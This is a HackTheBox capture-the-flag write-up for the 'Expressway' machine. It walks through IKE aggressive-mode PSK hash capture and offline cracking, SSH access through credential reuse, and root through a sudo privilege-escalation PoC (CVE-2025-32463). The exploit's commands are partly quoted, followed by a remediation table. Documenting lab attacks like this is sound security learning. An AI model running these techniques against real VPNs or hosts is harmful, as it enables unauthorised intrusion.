# 🧩 HackTheBox – Expressway

**Difficulty:** Medium  
**Objective:** Obtain user and root flags  
**IP:** `10.10.11.87`  
**Date solved:** Nov 2025  
**Author of write-up:** Gautam Grover
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._


---

## 1. Reconnaissance

### Nmap / Rustscan

```bash
$ nmap -sCV -p- -T4 10.10.11.87 -oA expressway_full
```

Result:

```
22/tcp  open  ssh     OpenSSH 10.0p2 Debian 8
```

No other TCP ports visible.  
A UDP sweep was therefore performed:

```bash
nmap -sUVC -F 10.10.11.87
69/udp   open  tftp     Netkit tftpd or atftpd 500/udp  open  isakmp   (XAUTH, Dead Peer Detection) 4500/udp open  nat-t-ike
```

🧠 **Interpretation:**

- TFTP → possible config/key leaks.
    
- IKE + NAT-T → IPsec VPN service.
    
- SSH → likely final entry point.
    

---

## 2. VPN Enumeration (UDP 500)

### ike-scan

`ike-scan -M 10.10.11.87`

`SA=(Enc=3DES Hash=SHA1 Group=2 Auth=PSK) VID=09002689dfd6b712 (XAUTH)`

Main Mode handshake confirmed **PSK + XAUTH**.  
An Aggressive-Mode probe exposed an identity:

`ike-scan -M -A 10.10.11.87`

`ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)`

✅ The gateway identified itself as **ike@expressway.htb** — giving both a possible username and vhost.

---

## 3. TFTP Enumeration

Initial filename brute-forcing returned nothing:

`tftp 10.10.11.87 tftp> get ipsec.conf Error code 1: File not found`

The server clearly restricted paths, but it confirmed TFTP read access existed.

---

## 4. Extracting and Cracking the VPN PSK

Aggressive-mode handshake with hash dump:

`ike-scan -M --aggressive 10.10.11.87 \           -n ike@expressway.htb \           --pskcrack=psk_hash.txt`

`psk_hash.txt` produced a long hash block.

### Offline crack

`psk-crack -d /usr/share/wordlists/rockyou.txt psk_hash.txt`

`key "[password omitted]" matches SHA1 hash ...`

🎯 **PSK discovered:** `[password omitted]`

---

## 5. Initial Foothold via SSH

Because PSKs and user credentials are often reused in lab setups, the PSK was tested directly as an SSH password.

`sshpass -p '[password omitted]' ssh ike@10.10.11.87`

`Last login: Sat Nov  8 ... Linux expressway.htb 6.16.7+deb14-amd64 ike@expressway:~$ id uid=1001(ike) gid=1001(ike)`

User flag:

`cat user.txt [flag omitted]`

---

## 6. Privilege Escalation

### Enumeration

`sudo -l # -> user ike may not run sudo find / -perm -4000 -type f | grep sudo`

Output:

`/usr/local/bin/sudo  (SUID root) /usr/bin/sudo        (SUID root)`

Two separate sudo binaries existed — a clear anomaly.

### Discovering the Exploit

In Ike’s home directory:

`exploit.sh  salam.c  salam.sh`

`exploit.sh` contained PoC code referencing **CVE-2025-32463 – Sudo EoP**.

Relevant portion:

`# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c sudo -R woot woot`

The exploit matches **Exploit-DB #52352**.

### Running the PoC

`chmod +x /tmp/sudo_chwoot.sh /tmp/sudo_chwoot.sh`

`[*] Running exploit… root@expressway:/# id uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)`

Root flag:

`cat /root/root.txt [flag omitted]`

---

## 7. Root Cause Analysis

- Two vulnerable **SUID sudo binaries** existed (`/usr/local/bin` and `/usr/bin`).
    
- The older `/usr/local/bin/sudo` was compiled prior to the patch for **CVE-2025-32463**.
    
- The exploit abuses a flaw in sudo’s restricted mode handling with NSS modules, leading to privilege escalation.
    

---

## 8. Post-Exploitation Evidence

`root@expressway:/# uname -a Linux expressway.htb 6.16.7+deb14-amd64 ... root@expressway:/# which sudo /usr/local/bin/sudo root@expressway:/# /usr/local/bin/sudo -V | head Sudo version 1.9.16`

---

## 9. Remediation

|Issue|Recommendation|
|---|---|
|Vulnerable SUID sudo (CVE-2025-32463)|Upgrade to latest patched sudo package. Remove duplicate copy in `/usr/local/bin`.|
|PSK & XAUTH authentication|Replace PSK + XAUTH with certificate-based authentication; rotate all shared keys.|
|TFTP service exposed|Disable TFTP or restrict to internal, authenticated configuration servers.|
|Excess SUID binaries|Review and remove unnecessary SUID permissions.|

---

## 10. Key Takeaways

1. **VPN misconfiguration** exposed sensitive PSK material that could be cracked offline.
    
2. **Credential reuse** enabled direct SSH access.
    
3. **Unpatched SUID binary** (sudo) provided full root compromise.
    
4. Layered enumeration (UDP → crypto crack → SSH → local exploit) highlights the value of holistic recon.
    

---

## 11. Proof of Compromise

|Stage|Command|Output|
|---|---|---|
|User|`cat /home/ike/user.txt`|`[flag omitted]`|
|Root|`cat /root/root.txt`|`[flag omitted]`|

---

## 12. Summary Diagram

```
┌────────────┐        ┌───────────────┐       ┌────────────┐ │ Attacker   │  ike-scan (UDP500) →  │ Expressway VPN │ │ 10.10.15.x │ ← PSK hash (AggMode)  │   (PSK + XAUTH)│ └────┬───────┘        └──────┬────────┘      │ psk-crack             │      ▼                       ▼  PSK = [password omitted]      │      ▼  SSH ike@10.10.11.87 (reuse)      │      ▼  user.txt      │      ▼  local PoC CVE-2025-32463 → root      │      ▼  root.txt
```
---

### 🎉 Flags

```
User : [flag omitted]
Root : [flag omitted]
```